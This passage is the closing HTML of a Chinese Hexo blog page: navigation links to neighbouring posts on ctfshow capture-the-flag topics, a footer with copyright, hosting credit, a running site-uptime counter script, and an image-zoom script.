href="/2025/11/07/ctfshow%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/" rel="prev" title="ctfshow大赛原题"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">ctfshow大赛原题</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2025/10/30/ctfshow%E5%B8%B8%E7%94%A8%E7%9F%A5%E8%AF%86/" rel="next" title="ctfshow常用知识"><span class="post-nav-text">ctfshow常用知识</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2024 – 2026 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> 伊卡洛维奇</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.3.0</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div class="live-time"><span>感谢陪伴</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2024-03-20T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = ` ${passDay} 天 ${passHour} 小时 ${passMinute} 分 ${passSecond} 秒`;
}
blog_live_time();
</script></div><div class="footer-custom-text">YourText <a href="yourLink" rel="noopener" target="_blank">Description</a></div><div class="footer-support"><span>本站由</span><a class="footer-support-logo" href="https://www.rainyun.com/YeMeng_" target="blank" title="雨云"><img height="30" src="https://cn-sy1.rains3.com/yemenghexo/rainyunlogo.png" alt="雨云"></a><span>提供 对象存储 服务</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
mediumZoom(images)</script><style>.medium-zoom-image {
  z-index: 99;
}</style></body></html>